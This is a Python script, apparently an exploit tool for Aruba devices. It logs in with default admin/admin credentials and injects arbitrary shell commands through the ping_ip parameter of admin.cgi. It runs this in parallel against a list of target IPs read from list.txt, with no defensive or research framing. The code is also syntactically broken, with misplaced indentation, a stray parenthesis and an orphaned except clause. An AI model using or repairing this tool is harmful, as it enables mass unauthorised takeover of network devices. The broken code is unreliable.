# Made By NRPE | Aruba 500 #

import concurrent.futures
import os
import requests
from functools import partial
import logging
import re
from requests.auth import HTTPBasicAuth

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def sanitize_command(command):
    return re.sub(r'[^a-zA-Z0-9_\-;]', '', command)

def send_da_hacks(ip, command):
    username = "admin"
    password = "admin"
    url = f"http://{ip}/login.cgi"
    login_payload = {
        "username": username,
        "password": password,
        "login": "Login"
}
    login_headers = {
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": ip,
    "Connection": "close"
}

session = requests.Session()
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    try:
        response = session.post(url, headers=login_headers, data=login_payload, verify=False, timeout=3)
        if response.status_code == 200 and "login failed" not in response.text.lower():
            logging.info(f"Login Succesfull!")
        else:
            logging.warning(f"{ip} Login Failed with status code: {response.status_code}")
    except requests.RequestException as e:
        logging.error(f"Error sending request to {ip}: {e}")
        
    ping_ip = f"4.2.2.4||{command}"
    
    data = {
        "ping_ip": ping_ip,
        "ping_timeout": "1",
        "textareai": "",
        "ping_start": "Ping"
    }
    
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": url,
        "Referer": f"{url}/admin.cgi?action=ping",
        "Connection": "close"
    }
    
    exploit_url = f"{url}/admin.cgi?action=ping"
     response = session.post(exploit_url, headers=headers, data=data, verify=False, timeout=3))
        if response.status_code == 200:
            logging.info(f"Command Sent To {ip}")
        else:
            logging.warning(f"Command to {ip} Failed with status code: {response.status_code}")
    except requests.RequestException as e:
        logging.error(f"Error sending command to {ip}: {e}")

def main(ip_list, command):
    if not os.path.exists(ip_list):
        logging.error(f"File {ip_list} not found!")
        return
    
    with open(ip_list, 'r') as file:
        ips = [line.strip() for line in file if line.strip()]

    if not ips:
        logging.warning("IP list is empty.")
        return

    sanitized_command = sanitize_command(command)

    success_count = 0
    failure_count = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor: # change max workers if needed
        futures = {executor.submit(partial(send_da_hacks, command=sanitized_command), ip): ip for ip in ips}

        for future in concurrent.futures.as_completed(futures):
            ip = futures[future]
            try:
                future.result()
                success_count += 1
            except Exception:
                failure_count += 1

    logging.info(f"Finished processing IPs: {success_count} succeeded, {failure_count} failed.")

if __name__ == "__main__":
    ip_list = "list.txt"
    command = "add your command"
    main(ip_list, command)       
